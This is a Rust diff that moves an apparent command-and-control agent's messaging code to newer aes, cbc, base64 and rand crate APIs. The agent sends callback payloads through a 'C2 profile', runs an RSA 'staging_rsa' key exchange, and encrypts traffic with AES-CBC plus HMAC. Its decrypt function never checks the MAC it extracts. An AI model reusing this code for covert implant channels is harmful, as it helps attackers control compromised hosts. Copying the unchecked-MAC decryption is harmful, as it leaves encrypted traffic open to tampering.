@@ -1,12 +1,12 @@
 use crate::payloadvars;
-use rand::Rng;
 use std::error::Error;
 
-use aes::Aes256;
-use block_modes::{block_padding::Pkcs7, BlockMode, Cbc};
-use hmac::{Hmac, Mac, NewMac};
+use aes::cipher::{block_padding::Pkcs7, BlockModeDecrypt, BlockModeEncrypt, KeyIvInit};
+use base64::prelude::{Engine as _, BASE64_STANDARD};
+use hmac::{Hmac, KeyInit, Mac};
 use http::{profilevars, HTTPProfile};
 use openssl::rsa;
+use rand::distr::{Alphanumeric, SampleString};
 use serde::Deserialize;
 use serde_json::json;
 use sha2::Sha256;
@@ -95,19 +95,19 @@ impl Profile {
 
         // Formulate the post request payload and encrypt it if necessary
         let req_payload: String = match profile.get_aes_key() {
-            Some(key) => base64::encode(encrypt_payload(
+            Some(key) => BASE64_STANDARD.encode(encrypt_payload(
                 data.as_bytes(),
                 key,
                 Some(&self.callback_uuid),
             )),
-            None => base64::encode(format!("{}{}", self.callback_uuid, data)),
+            None => BASE64_STANDARD.encode(format!("{}{}", self.callback_uuid, data)),
         };
 
         // Send the payload through the configured C2 profile
         let body = profile.c2send(&req_payload).unwrap();
 
         // Decode the response
-        let decoded = base64::decode(body)?;
+        let decoded = BASE64_STANDARD.decode(body)?;
 
         // Decrypt the payload if needed
         let decrypted_body: Vec<u8> = match profile.get_aes_key() {
@@ -155,15 +155,11 @@ impl Profile {
         let rsa_key = rsa::Rsa::generate(4096)?;
         let public_key = rsa_key.public_key_to_pem_pkcs1()?;
 
-        // Generate a random session id
-        let mut session_id: [char; 20] = ['a'; 20];
-        rand::thread_rng().try_fill(&mut session_id)?;
-
         // Formulate the body for staging a key exchange
         let body = json!({
             "action": "staging_rsa",
-            "pub_key": base64::encode(public_key),
-            "session_id": session_id.iter().cloned().collect::<String>(),
+            "pub_key": BASE64_STANDARD.encode(public_key),
+            "session_id": Alphanumeric.sample_string(&mut rand::rng(), 20),
         })
         .to_string();
 
@@ -183,7 +179,7 @@ impl Profile {
 
         // Grab the new AES key from the RSA encrypted response
         let mut new_key = vec![0; rsa_key.size() as usize];
-        let encrypted_aes_key = base64::decode(&body.session_key)?;
+        let encrypted_aes_key = BASE64_STANDARD.decode(&body.session_key)?;
 
         rsa_key.private_decrypt(&encrypted_aes_key, &mut new_key, rsa::Padding::PKCS1_OAEP)?;
         new_key.truncate(32);
@@ -238,15 +234,16 @@ fn encrypt_aes256(data: &[u8], key: &[u8]) -> Vec<u8> {
     let mut h = HmacSha256::new_from_slice(key).unwrap();
 
     // Generate a random IV
-    let iv = rand::random::<[u8; 16]>().to_vec();
+    let iv = rand::random::<[u8; 16]>();
 
     // AES encrypt the data
-    type Aes256Cbc = Cbc<Aes256, Pkcs7>;
-    let cipher = Aes256Cbc::new_from_slices(key, &iv).unwrap();
-    let mut ciphertext = cipher.encrypt_vec(data);
+    type Aes256CbcEnc = cbc::Encryptor<aes::Aes256>;
+    let key = <[u8; 32]>::try_from(key).unwrap();
+    let cipher = Aes256CbcEnc::new(&key.into(), &iv.into());
+    let mut ciphertext = cipher.encrypt_padded_vec::<Pkcs7>(data);
 
     // Create the encrypted output (iv + message + mac)
-    let mut msg = iv;
+    let mut msg = Vec::from(iv);
     msg.append(&mut ciphertext);
 
     h.update(&msg);
@@ -262,7 +259,7 @@ fn encrypt_aes256(data: &[u8], key: &[u8]) -> Vec<u8> {
 /// * `key` - Key for decryption
 fn decrypt_aes256(data: &[u8], key: &[u8]) -> Vec<u8> {
     // Grab the IV
-    let iv = &data[..16];
+    let iv = <[u8; 16]>::try_from(&data[..16]).unwrap();
 
     // Grab the MAC
     let _mac = &data[data.len() - 32..];
@@ -271,9 +268,10 @@ fn decrypt_aes256(data: &[u8], key: &[u8]) -> Vec<u8> {
     let message = &data[16..data.len() - 32];
 
     // Decrypt the message
-    type Aes256Cbc = Cbc<Aes256, Pkcs7>;
-    let cipher = Aes256Cbc::new_from_slices(key, iv).unwrap();
+    type Aes256CbcDec = cbc::Decryptor<aes::Aes256>;
+    let key = <[u8; 32]>::try_from(key).unwrap();
+    let cipher = Aes256CbcDec::new(&key.into(), &iv.into());
 
     // Return the decrypted message
-    cipher.decrypt_vec(message).unwrap()
+    cipher.decrypt_padded_vec::<Pkcs7>(message).unwrap()
 }
